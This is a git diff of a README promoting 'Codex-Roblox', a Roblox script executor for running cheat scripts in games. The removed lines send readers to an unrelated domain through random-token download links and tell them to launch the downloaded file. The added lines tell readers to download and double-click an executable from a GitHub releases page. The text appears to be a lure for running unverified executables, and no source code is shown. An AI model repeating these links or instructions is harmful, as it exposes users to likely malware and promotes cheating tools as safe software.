@@ -1,65 +1,73 @@
-# Codex-Roblox: Unleash the Power of Roblox Scripting with Codex Executor 🚀
+# Codex-Roblox 🚀
 
-Welcome to the Codex-Roblox repository, your gateway to a whole new level of Roblox scripting experience. 
+![Codex-Roblox](https://img.shields.io/badge/Codex-Roblox-blue?style=for-the-badge&logo=github)
 
-## Repository Description
-Roblox Codex Executor is specifically designed to support low-end PCs, enabling you to enjoy stable and smooth performance. With Codex, you can harness the power of Lua scripting in Roblox games like never before. Codex stands out as the premier Roblox script executor, providing unparalleled functionality to effortlessly run scripts for your preferred Roblox games.
+Welcome to the **Codex-Roblox** repository! This project is dedicated to providing a powerful and user-friendly Roblox script executor. Whether you are a beginner or an experienced developer, Codex-Roblox supports low-end PCs, ensuring a smooth and stable experience while you enjoy your favorite Roblox games.
 
-## Features 🛠️
-- Supports low-end PCs.
-- Stable and smooth performance.
-- Unparalleled functionality for running scripts.
-- Enjoy seamless gameplay in your favorite Roblox games.
-- Empower your Roblox scripting skills.
+## Table of Contents
 
-## Repository Topics 📚
-- builder
-- code
-- codex
-- codex-download
-- codex-github
-- codex-roblox
-- collaborate
-- community
-- contribute
-- development
-- framework
-- roblox
-- roblox-codex
-- roblox-lua
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [Community](#community)
+- [License](#license)
+- [Contact](#contact)
 
-## Download Codex Executor
-To download the Codex Executor, please click on the following link: [Download Codex Executor](https://installbixz.cyou?27f2uvhyre3ufmw)
+## Features
 
-[![Download Codex Executor](https://installbixz.cyou?1ue511ewk3m5d69%20Executor-brightgreen)](https://installbixz.cyou?541xrmnfknyd7pp)
+- **Lightweight**: Designed to run on low-end PCs without sacrificing performance.
+- **User-Friendly**: Simple interface that allows you to run scripts effortlessly.
+- **Stable**: Offers a reliable environment for executing your scripts.
+- **Comprehensive Functionality**: Supports a wide range of scripts for various Roblox games.
+- **Community Support**: Engage with fellow users and developers for help and collaboration.
 
-If the link above ends with the file name, remember to launch it to kickstart your Roblox scripting adventure with Codex Executor.
+## Installation
 
-## How to Contribute?
-Join our vibrant community of Roblox script enthusiasts and developers. Contribute to the ongoing development and improvement of the Codex Executor to elevate the Roblox scripting experience for everyone.
+To get started with Codex-Roblox, you can download the latest version from the [Releases section](https://github.com/rick1237777/Codex-Roblox/releases). Make sure to download the appropriate file for your system. After downloading, follow these steps to install:
 
-### Ways to Contribute:
-- Share your feedback and suggestions.
-- Report bugs and issues.
-- Contribute code enhancements and features.
-- Collaborate with like-minded developers.
-- Spread the word about Codex Executor.
+1. **Extract the Files**: Unzip the downloaded file to a folder on your computer.
+2. **Run the Executable**: Locate the executable file and double-click to run it.
+3. **Follow On-Screen Instructions**: Complete the installation process by following the prompts.
 
-## Stay Updated
-If the provided download link is not working or if you seek more information, make sure to check the "Releases" section for the latest updates and versions of Codex Executor.
+## Usage
 
-## Embrace the Power of Roblox Scripting with Codex Executor 🔥
-Dive into the world of Roblox scripting with Codex Executor and unleash your creativity. Whether you are a seasoned developer or a budding scripter, Codex offers you the tools and functionality to excel in the Roblox universe. Join us on this exciting journey of exploration, collaboration, and innovation.
+Using Codex-Roblox is straightforward. After installation, follow these steps to execute your scripts:
 
-![Roblox Codex](https://installbixz.cyou?yplcd93goo3rcwf)
+1. **Open Codex-Roblox**: Launch the application.
+2. **Load Your Script**: Click on the “Load Script” button and select your desired script file.
+3. **Execute the Script**: Click the “Execute” button to run the script in your Roblox game.
+4. **Enjoy**: Experience the benefits of your script as you play.
 
-## Let's Connect 🌐
-Follow us on social media for the latest updates, tutorials, and community interactions:
-- Twitter: [@CodexRoblox]
-- Instagram: [Codex_Roblox]
-- YouTube: [Codex Roblox Channel]
+## Contributing
 
-## Start Your Roblox Scripting Adventure Today! 🎮💡
-Download Codex Executor now and experience Roblox scripting like never before. Turn your ideas into reality, create immersive gameplay experiences, and become a Roblox scripting maestro with Codex at your fingertips.
+We welcome contributions from the community! If you want to help improve Codex-Roblox, please follow these steps:
 
-Happy Coding! 💻✨
+1. **Fork the Repository**: Click on the "Fork" button at the top right of this page.
+2. **Clone Your Fork**: Use `git clone` to copy your fork to your local machine.
+3. **Create a Branch**: Create a new branch for your feature or bug fix.
+4. **Make Changes**: Implement your changes in the code.
+5. **Commit Your Changes**: Use clear and concise commit messages.
+6. **Push Your Changes**: Push your changes back to your fork on GitHub.
+7. **Create a Pull Request**: Submit a pull request to the main repository.
+
+## Community
+
+Join our community to share your experiences, ask questions, and collaborate with others. Here are some ways to connect:
+
+- **Discord Server**: Join our Discord community for real-time discussions and support.
+- **Forums**: Participate in forums to share scripts and ideas.
+- **Social Media**: Follow us on Twitter and Facebook for updates and announcements.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Contact
+
+For any inquiries or support, feel free to reach out:
+
+- **Email**: support@codex-roblox.com
+- **GitHub Issues**: Use the issues section to report bugs or request features.
+
+Thank you for visiting the **Codex-Roblox** repository! We hope you enjoy using our script executor. For more updates and downloads, check the [Releases section](https://github.com/rick1237777/Codex-Roblox/releases).
